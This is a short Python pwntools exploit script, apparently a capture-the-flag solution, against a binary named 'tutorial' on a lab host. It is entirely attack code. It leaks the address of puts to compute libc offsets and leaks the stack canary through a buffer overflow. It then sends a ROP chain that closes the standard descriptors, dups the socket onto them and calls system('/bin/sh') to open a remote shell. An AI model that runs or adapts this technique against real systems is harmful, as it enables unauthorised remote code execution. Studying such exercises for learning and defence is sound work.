from pwn import *

debug = 0
if debug:
	p = process('./tutorial')
else:
	p = remote('192.168.109.131', 10000)

pop_rdi_ret = 0x00000000004012e3
libc = ELF('libc.so_ub')
system_off = libc.symbols['puts'] - libc.symbols['system']
dup_off = libc.symbols['puts'] - libc.symbols['dup']
binsh_off = libc.symbols['puts'] - next(libc.search('/bin/sh'))
close_off = libc.symbols['puts'] - libc.symbols['close']

#get the address
p.recvuntil(">")
p.sendline("1")
r = p.recvline()
puts_addr = int(r[10:-1], 16) + 1280
print "puts_address: " + hex(puts_addr)
system_addr = puts_addr - system_off
print "system_address: " + hex(system_addr)
dup_addr = puts_addr - dup_off
print "dup_address: " + hex(dup_addr)
binsh_addr = puts_addr - binsh_off
print "binsh_address: " + hex(binsh_addr)
close_addr = puts_addr - close_off
print "close_address: " + hex(close_addr)

#leak the canary
p.recvuntil(">")
p.sendline("2")
p.recvuntil(">")
p.sendline('a' * 311)
canary = p.recv()[312:320]
print (canary)

#rop to get shell
p.recvuntil(">")
p.sendline("2")
p.recvuntil(">")
payload = 'a' * 312 + canary + 'b' * 8 + p64(pop_rdi_ret) + p64(0) + p64(close_addr)
payload += p64(pop_rdi_ret) + p64(1) + p64(close_addr) + p64(pop_rdi_ret) + p64(4) + p64(dup_addr)
payload += p64(dup_addr) + p64(pop_rdi_ret)  + p64(binsh_addr) + p64(system_addr)

p.sendline(payload)

p.interactive()
